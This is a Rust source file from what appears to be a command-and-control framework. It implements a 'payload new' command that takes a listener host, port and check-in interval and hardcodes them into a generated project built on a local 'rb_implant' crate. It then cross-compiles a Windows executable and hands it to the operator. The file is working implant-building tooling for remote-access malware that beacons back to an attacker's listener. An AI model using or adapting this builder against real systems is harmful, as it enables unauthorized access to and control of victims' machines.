use crate::command::*;
use crate::message::{CommandOutput, CommandError, CommandResult};
use clap::{Arg, ArgMatches, Command as ClapCommand};
use std::any::Any;
use std::error::Error;
use std::path::PathBuf;

// Configuration for payload generation
#[derive(Debug)]
pub struct PayloadConfig {
    pub host: String,
    pub port: u16,
    pub interval: u64,
}

pub struct PayloadCommand;

impl RbCommand for PayloadCommand {
    fn name(&self) -> &'static str {
        "payload"
    }

    fn command_type(&self) -> CommandType {
        CommandType::Server
    }

    fn description(&self) -> &'static str {
        "Generate and manage payloads"
    }

    fn parse_args(&self, command_line: &str) -> Result<Box<dyn Any>, clap::Error> {
        let cmd = ClapCommand::new("payload")
            .about("Generate and manage payloads")
            .subcommand(
                ClapCommand::new("new")
                    .about("Generate a new payload")
                    .arg(
                        Arg::new("lhost")
                            .long("lhost")
                            .help("Listener host (IP or hostname)")
                            .required(true),
                    )
                    .arg(
                        Arg::new("lport")
                            .long("lport")
                            .help("Listener port")
                            .default_value("8080"),
                    )
                    .arg(
                        Arg::new("interval")
                            .long("interval")
                            .help("Check-in interval in seconds")
                            .default_value("5"),
                    ),
            );

        // Split the command line into arguments
        let args: Vec<_> = command_line.split_whitespace().collect();
        
        // Parse the command line
        let matches = cmd.try_get_matches_from(args)?;
        
        // Return the matches
        Ok(Box::new(matches))
    }

    fn execute_with_parsed_args(
        &self,
        context: &mut CommandContext,
        args: Box<dyn Any>,
    ) -> CommandResult {
        let matches = match args.downcast::<ArgMatches>() {
            Ok(matches) => *matches,
            Err(_) => {
                return Err(CommandError::InvalidArguments("Failed to parse arguments".to_string()));
            }
        };

        // Handle subcommands
        if let Some(("new", sub_matches)) = matches.subcommand() {
            // Create a new payload
            let host = sub_matches.get_one::<String>("lhost").unwrap().clone();
            let port = sub_matches
                .get_one::<String>("lport")
                .unwrap()
                .parse::<u16>()
                .unwrap_or(8080);
            let interval = sub_matches
                .get_one::<String>("interval")
                .unwrap()
                .parse::<u64>()
                .unwrap_or(5);

            let config = PayloadConfig {
                host,
                port,
                interval,
            };

            // Generate the payload
            match self.generate_payload(config) {
                Ok((path, data)) => {
                    let name = path
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_else(|| "rb_payload.exe".to_string());
                    Ok(CommandOutput::File { name, data })
                }
                Err(e) => {
                    Err(CommandError::ExecutionFailed(format!("Failed to generate payload: {}", e)))
                }
            }
        } else {
            // Show help if no subcommand is specified
            let help = "Usage: payload new --lhost <ip> --lport <port> [--interval <seconds>]".to_string();
            Ok(CommandOutput::Text(help))
        }
    }
}

impl PayloadCommand {
    fn generate_payload(&self, config: PayloadConfig) -> Result<(PathBuf, Vec<u8>), Box<dyn Error>> {
        use std::fs;
        use std::process::Command;

        // Create the build directory
        fs::create_dir_all("rb_payload_build/src")?;

        // 1) Write a minimal Cargo.toml that depends on the local rb_implant crate
        let manifest = r#"
[package]
name = "rb_payload"
version = "0.1.0"
edition = "2021"

[dependencies]
rb_implant = { path = "../rb_implant" }
tokio = { version = "1", features = ["full"] }
"#;
        fs::write("rb_payload_build/Cargo.toml", manifest)?;

        // 2) Write main.rs that configures and invokes the shared implant entry-point
        let main_rs = format!(r#"
use rb_implant::{{Args, run_implant_with_args}};

#[tokio::main]
async fn main() {{
    // Use hardcoded configuration
    let args = Args {{
        host: "{}".to_string(),
        port: {},
        interval: {},
    }};

    if let Err(e) = run_implant_with_args(args).await {{
        eprintln!("Fatal error: {{}}", e);
        std::process::exit(1);
    }}
}}
"#, config.host, config.port, config.interval);

        fs::write("rb_payload_build/src/main.rs", main_rs)?;

        // 3) Build the project targeting Windows GNU
        println!("Building payload...");
        let output = Command::new("cargo")
            .current_dir("rb_payload_build")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .output()?;
        
        if !output.status.success() {
            return Err(format!(
                "Build failed: {}",
                String::from_utf8_lossy(&output.stderr)
            ).into());
        }

        // 4) Return the path to the .exe
        let exe_path = PathBuf::from(
            "rb_payload_build/target/x86_64-pc-windows-gnu/release/rb_payload.exe",
        );
        
        if !exe_path.exists() {
            return Err("Build completed but executable not found at expected path".into());
        }

        // 5) Read the executable so it can be sent to the client
        let data = fs::read(&exe_path)?;

        Ok((exe_path, data))
    }
}
